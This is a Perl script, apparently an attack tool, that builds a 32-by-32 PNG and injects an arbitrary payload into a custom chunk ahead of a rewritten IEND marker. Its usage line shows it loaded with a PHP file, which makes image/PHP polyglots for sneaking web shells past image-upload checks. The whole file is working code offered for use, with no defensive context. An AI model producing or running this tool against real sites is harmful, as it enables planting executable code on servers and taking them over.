#!/usr/bin/env perl
#./png.pl -payload "$(cat payload.php)" -output xx.png
use strict;
use warnings;
no  warnings 'redefine';
use feature  'say';
use POSIX;
use Getopt::Long;
use GD;
use String::CRC32;
sub systell;
sub rewind;
sub usage;
sub create_png;
sub inject_payload;
GetOptions(
    'help!'     =>  \my $help,
    'payload=s' =>  \my $payload,
    'output=s'  =>  \my $outfile,
);
usage(0)     if $help;
usage(1) unless $outfile;
$payload //= '';
create_png unless -f $outfile;
inject_payload;
say `file $outfile`   if -f '/usr/bin/file';
say `hexdump -C $outfile`   if -f '/usr/bin/hexdump';
sub systell {
    sysseek $_[0], 0, SEEK_CUR
}
sub rewind {
    sysseek $_[0], systell($_[0]) - $_[1], SEEK_CUR
}
sub usage {
    say <<"EOF";
Usage: $0 [-payload 'STRING'] -output x.png
EOF
    exit +shift;
}
sub create_png {
    my $img = GD::Image->new(
        32,
        32,
         1,
         );
    my $color = $img->colorAllocate(0, 0, 0);
    $img->setPixel(0, 0, $color);
    sysopen my $fh, $outfile, O_CREAT|O_WRONLY;
    syswrite   $fh, $img->png;
    close      $fh;
}
sub inject_payload {
    sysopen our $fh, $outfile, O_RDWR;
    {
        my $format;
        sysseek     $fh, 1, SEEK_SET;
        sysread     $fh, $format, 3;

        die "ERROR: $outfile is not a PNG file.\n"
            if $format ne "PNG";
    }
    sysseek     $fh, 8, SEEK_SET;
    sub read_chunks {
        *read_next_chunk = \&read_chunks;
        my ($chunk_size, $chunk_type, $content, $crc);
        sysread $fh, $chunk_size, 4;
        sysread $fh, $chunk_type, 4;
        $chunk_size = unpack('I>', $chunk_size);    
        say "[+] Chunk size: $chunk_size"; 
        say "[+] Chunk type: $chunk_type";
        return if $chunk_type eq 'IEND';
        sysread $fh, $content, $chunk_size;
        sysread $fh, $crc, 4;
        say '[+] CRC: ' . unpack('H8', $crc);
        &read_next_chunk;
    }
    &read_chunks;
    rewind   $fh, 8;
    syswrite $fh, (pack 'I>', length $payload);
    syswrite $fh, "\x50\x55\x6e\x4b";
    syswrite $fh, $payload;
    syswrite $fh, (pack 'I>', crc32('IEND' . $payload));
    syswrite $fh, "\x00IEND";
    close    $fh;
}
